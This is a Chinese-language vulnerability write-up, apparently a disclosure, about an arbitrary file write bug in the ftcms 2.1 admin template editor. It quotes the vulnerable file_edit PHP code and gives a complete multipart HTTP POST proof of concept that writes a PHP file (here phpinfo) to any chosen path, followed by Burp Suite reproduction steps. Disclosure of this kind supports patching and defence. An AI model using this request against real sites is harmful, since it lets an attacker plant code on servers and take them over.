# ftcms存在任意文件写入漏洞

供应商：http://www.ftcms.cn/

软件下载链接：http://www.ftcms.cn/skin/ftcms_v2.1.zip

影响版本：ftcms<=2.1

## 1.漏洞分析

此任意文件写入漏洞的原理是使用后台模板函数修改本地文件造成的。接下来，根据代码分析漏洞是如何引起的。

首先，找到模板并修改文件代码。文件位置为admin/controllers/tp.php

```text
对应请求链接为
http://demo.ftcms.cn/admin/index.php/tp/file_edit/?style=template&tp=default&file=../config.php
```

数据库配置写入的相应方法是file_edit

```php
	 //编辑文件	 
   public  function file_edit(){
	         $this->load->helper('file');//加载文件辅助函数
            $data=$this->input->post();
            if(!empty($data)){//写入文件信息
				 $style = isset($data['info']['style']) && trim($data['info']['style']) ? trim($data['info']['style']) : '';
				 $file = isset($data['info']['file']) && trim($data['info']['file']) ? trim($data['info']['file']) : '';
				 $tp=$data['info']['tp'];
				  
				  $dir=$file;

				 if(write_file($dir, $data['info']['content'])){
				         $this->message('修改成功！',site_url($this->router->class.'/file_lists?style='.$style.'&tp='.$tp));
                 }else{

                       $this->message('修改失败 ！请检查文件权限'.$dir,site_url($this->router->class.'/file_lists?style='.$style.'&tp='.$tp));
                 }

			}else{
			     $style = isset($_GET['style']) && trim($_GET['style']) ? trim($_GET['style']) : '';
				 $file = isset($_GET['file']) && trim($_GET['file']) ? trim($_GET['file']) : '';
				 $data['tp']=$_GET['tp'];

				$dir=$file;
			    $data['file']=$file;
			    $data['style']=$style;
				$data['res']=read_file($dir);//获取文件内容
				
				$this->load->vars('data',$data);	
				$this->load->view($this->router->class.'/file_edit');
			}	
			
    }
```

![image](https://user-images.githubusercontent.com/54017627/168748444-8d372173-606d-48cd-8742-1e5bc52dc004.png)

首先，将使用帮助类中的文件帮助程序函数

然后在输入类中使用$this - >输入 - > post（）;从用户的帖子中获取所有数据的方法。根据数据内容是否为空来执行以下两个分支。当过帐数据不为空时，将执行以下分支

![image](https://user-images.githubusercontent.com/54017627/168748521-63ba1822-a130-43ec-bccb-c0f5c3f437c0.png)

![image](https://user-images.githubusercontent.com/54017627/168748532-6fc6821e-3f46-41f3-a0e6-7ea16d6a1c4e.png)

首先，判断样式和文件这两个参数是否在请求中设置。如果是这样，请使用 trim 函数删除空格，否则它将为空。然后直接从请求中获取TP参数。此参数尚未经过过滤和处理，这也为后续漏洞利用铺平了道路

![image](https://user-images.githubusercontent.com/54017627/168748576-cff031de-b38d-4a14-9310-b289c3e3f9c6.png)

然后将$file变量的内容赋给$dir变量

![image](https://user-images.githubusercontent.com/54017627/168748609-7788f0a3-183d-4e74-9891-6f7b0ba4ddd1.png)

然后调用 write_ file 函数将$date中的内容写入指定的文件。未检测到要写入的内容和要写入的文件路径。因此，可以写入任何文件，从而导致任意代码执行漏洞 

write_ 文件函数位于帮助类中。让我们跟随并分析它

![image](https://user-images.githubusercontent.com/54017627/168748702-8ae90f14-c997-4e13-baf1-2ec2038b0ba9.png)

文件写入使用 fopen。 

最终的 POC 如下所示

```php
POST /admin/index.php/tp/file_edit HTTP/1.1
Host: ft.rapoo.top
Content-Length: 613
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://ft.rapoo.top
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLr5g9ZAUkCZeeyrl
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://ft.rapoo.top/admin/index.php/tp/file_edit/?style=template&tp=default&file=D:\phpstudy_pro\WWW\ft.rapoo.top\application\views\default\ceshi.php
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryLr5g9ZAUkCZeeyrl
Content-Disposition: form-data; name="info[content]"

<?php
phpinfo();
?>//这里为需要写入的内容
------WebKitFormBoundaryLr5g9ZAUkCZeeyrl
Content-Disposition: form-data; name="info[style]"

template
------WebKitFormBoundaryLr5g9ZAUkCZeeyrl
Content-Disposition: form-data; name="info[tp]"

default
------WebKitFormBoundaryLr5g9ZAUkCZeeyrl
Content-Disposition: form-data; name="info[file]"

需要写入的文件路径
------WebKitFormBoundaryLr5g9ZAUkCZeeyrl
Content-Disposition: form-data; name="dosubmit"

æäº¤
------WebKitFormBoundaryLr5g9ZAUkCZeeyrl--
```

## 2.漏洞复现

### 2.1 登录网站

![image](https://user-images.githubusercontent.com/54017627/168748888-5df6f14b-5f38-477e-bae0-01494ac9bef2.png)

### 2.2 写入文件

只需使用 burpsuite 发送请求

![image](https://user-images.githubusercontent.com/54017627/168748982-bfbcf940-2aea-413a-96a7-43610ba089f7.png)

![image](https://user-images.githubusercontent.com/54017627/168749005-e05dd818-effd-4f04-a2b9-c3efbf75ef30.png)

并在浏览器中请求文件

![image](https://user-images.githubusercontent.com/54017627/168749052-d349138b-d066-425f-8a1f-94c64c33abcd.png)
